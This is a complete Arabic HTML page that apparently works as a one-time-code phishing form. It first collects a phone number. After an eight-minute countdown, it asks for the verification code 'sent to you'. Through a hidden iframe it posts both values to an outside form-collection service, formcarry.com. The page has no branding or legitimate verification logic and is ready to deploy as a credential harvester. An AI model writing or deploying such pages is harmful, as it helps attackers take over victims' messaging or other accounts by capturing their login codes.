<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>نموذج رقم الهاتف والكود - إرسال بضغطة واحدة</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }
    .container {
      background: white;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
      padding: 30px 40px;
      width: 100%;
      max-width: 420px;
      box-sizing: border-box;
    }
    h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #333;
      font-weight: 700;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #555;
    }
    input[type="tel"],
    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 8px;
      border: 1.8px solid #ccc;
      margin-bottom: 20px;
      transition: border-color 0.3s ease;
      font-family: inherit;
      box-sizing: border-box;
    }
    input[type="tel"]:focus,
    input[type="text"]:focus {
      border-color: #28a745;
      outline: none;
    }
    button {
      width: 100%;
      padding: 14px;
      font-size: 18px;
      background-color: #28a745;
      border: none;
      border-radius: 8px;
      color: white;
      cursor: pointer;
      font-weight: 700;
      transition: background-color 0.3s ease;
    }
    button:hover:not(:disabled) {
      background-color: #218838;
    }
    button:disabled {
      background-color: #94d3a2;
      cursor: not-allowed;
    }
    #timer {
      text-align: center;
      font-weight: 600;
      color: #666;
      margin-bottom: 20px;
      min-height: 24px;
    }
    #codeField {
      display: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>نموذج رقم الهاتف والكود</h2>
    <form id="mainForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return false;">
      <label for="phone">رقم الهاتف:</label>
      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />

      <div id="codeField">
        <label for="code">الكود المرسل إليك:</label>
        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
      </div>

      <button type="button" id="sendBtn" onclick="sendData()">إرسال</button>

      <div id="timer"></div>
    </form>
  </div>

  <iframe name="hidden_iframe" style="display:none;"></iframe>

  <script>
    const phoneInput = document.getElementById('phone');
    const codeField = document.getElementById('codeField');
    const codeInput = document.getElementById('code');
    const sendBtn = document.getElementById('sendBtn');
    const timerDisplay = document.getElementById('timer');
    let countdownInterval;
    let timeLeft = 0;

    function startTimer(duration) {
      timeLeft = duration;
      timerDisplay.style.display = 'block';
      updateTimer();
      countdownInterval = setInterval(() => {
        timeLeft--;
        updateTimer();
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          timerDisplay.style.display = 'none';
          sendBtn.disabled = false;
        }
      }, 1000);
    }

    function updateTimer() {
      const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
      const seconds = (timeLeft % 60).toString().padStart(2, '0');
      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${seconds}`;
    }

    function sendData() {
      // تحقق رقم الهاتف
      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
        phoneInput.focus();
        return;
      }

      // إذا الكود غير ظاهر (أول إرسال)، نظهره ونبدأ المؤقت، ونرسل رقم الهاتف فقط مع كود فارغ
      if (codeField.style.display === 'none' || codeField.style.display === '') {
        codeField.style.display = 'block';
        codeInput.value = '';
        sendBtn.disabled = true;
        startTimer(480); // 8 دقائق

        // أضف حقل كود مخفي فارغ لإرسال مع الفورم
        let hiddenCodeInput = document.querySelector('input[name="code"][type="hidden"]');
        if (!hiddenCodeInput) {
          hiddenCodeInput = document.createElement('input');
          hiddenCodeInput.type = 'hidden';
          hiddenCodeInput.name = 'code';
          document.getElementById('mainForm').appendChild(hiddenCodeInput);
        }
        hiddenCodeInput.value = '';

        document.getElementById('mainForm').submit();
        alert('تم إرسال رقم الهاتف، يمكنك الآن إدخال الكود المرسل إليك.');

      } else {
        // إذا خانة الكود ظاهرة، تحقق من إدخال الكود ثم أرسل رقم الهاتف والكود دفعة واحدة
        if (codeInput.value.trim() === '') {
          alert('يرجى كتابة الكود المرسل إليك.');
          codeInput.focus();
          return;
        }

        // تأكد حذف الحقل المخفي إذا موجود
        const hiddenCodeInput = document.querySelector('input[name="code"][type="hidden"]');
        if (hiddenCodeInput) hiddenCodeInput.remove();

        document.getElementById('mainForm').submit();
        alert('تم إرسال رقم الهاتف والكود.');
      }
    }
  </script>

</body>
</html>
